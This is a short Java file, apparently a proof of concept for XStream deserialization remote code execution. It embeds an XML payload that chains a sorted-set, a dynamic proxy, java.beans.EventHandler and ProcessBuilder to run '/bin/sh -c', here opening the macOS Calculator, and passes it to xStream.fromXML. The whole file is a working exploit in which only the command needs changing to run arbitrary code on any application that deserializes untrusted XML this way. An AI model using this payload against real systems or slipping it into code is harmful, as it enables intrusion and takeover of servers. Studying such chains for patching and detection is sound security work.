package point_xstream_fromxml;

import com.thoughtworks.xstream.XStream;

public class Main {
    public static void main(String[] args) {
//        expGen();
        String payload = "<sorted-set>\n" +
                "    <string>foo</string>\n" +
                "    <dynamic-proxy>\n" +
                "    <interface>java.lang.Comparable</interface>\n" +
                "        <handler class=\"java.beans.EventHandler\">\n" +
                "            <target class=\"java.lang.ProcessBuilder\">\n" +
                "                <command>\n" +
                "                    <string>/bin/sh</string>\n" +
                "                    <string>-c</string>\n" +
                "                    <string>open /System/Applications/Calculator.app</string>\n" +
                "                </command>\n" +
                "            </target>\n" +
                "     <action>start</action>"+
                "        </handler>\n" +
                "    </dynamic-proxy>\n" +
                "</sorted-set>\n";
        XStream xStream = new XStream();
        xStream.fromXML(payload);
    }
}
